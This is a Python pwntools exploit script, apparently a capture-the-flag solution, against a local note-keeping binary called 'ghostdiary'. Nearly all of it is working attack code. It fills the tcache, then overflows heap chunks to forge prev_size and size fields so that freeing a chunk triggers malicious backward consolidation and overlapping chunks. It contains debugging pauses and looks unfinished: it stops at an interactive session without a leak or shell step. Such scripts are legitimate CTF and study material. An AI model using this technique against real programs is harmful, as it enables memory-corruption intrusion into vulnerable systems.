from pwn import *
context.update(arch='amd64', os='linux', log_level='debug')

list_free = []
p = process('ghostdiary')


def addNote(size):
    p.sendlineafter('>', '1')
    if size <= 0xf0:
        p.sendlineafter('>', '1')
    elif size > 0x10f:
        p.sendlineafter('>', '2')
    else:
        print 'invalid size'
        exit(0)
    p.sendlineafter(':', str(size))
    data = p.recvline()
    print 'data: ' + data
    return data.split('#')[1].replace('\x0a', '')

def writeNote(idx, contents):
    p.sendlineafter('>', '2')
    p.sendlineafter(':', str(idx))
    p.sendlineafter(':', contents)

def printNote(idx):
    p.sendlineafter('>', '3')
    p.sendlineafter(':', idx)
    p.recvuntil(':')
    data = p.recvline()
    return data

def burnNote(idx):
    p.sendlineafter('>', '4')
    p.sendlineafter(':', str(idx))

def fillTcacheAlloc(size):
    for i in range(7):
        list_free.append(addNote(size))
def fillTcacheFree():
    for x in list_free:
        burnNote(x)

idx_o = addNote(0x30)
writeNote(idx_o, 'o'*0x30)

idx_A = addNote(0x128)
writeNote(idx_A, 'A'*0x120+p64(0x120))

idx_B = addNote(0x118)
writeNote(idx_B, 'B'*0x118)

idx_C = addNote(0x118)
writeNote(idx_C,'C'*0xf8)

addNote(0xf0)

fillTcacheAlloc(0x128)
fillTcacheAlloc(0xf0)



#filling up tcache
fillTcacheFree()

#free A
burnNote(idx_A)

#free o & allocate o & overflow o to write a's size
raw_input('debugging... ' + str(p.pid))
burnNote(idx_o)
idx_O = addNote(0x128)
writeNote(idx_O, 'O'*0x120+p64(0x240))

#overflow B to set inuse flag of C
writeNote(idx_B, 'B'*0x110+p64(0x120*2+0x10))

#insert fake chunk into C
writeNote(idx_C, 'C'*(0xf8)+p64(0x110-0xf8-8+1+0x10))
#free C & consolidation from A ~ C
log.info('index_C : ' + str(idx_C))
raw_input('debugging... : ' + str(p.pid))
burnNote(idx_C)
p.interactive()


for i in range(7):
    list_free.append(addNote(0x118))

idx_D = addNote(0x118)
writeNote(idx_D, 'D'*0x116)

p.interactive()



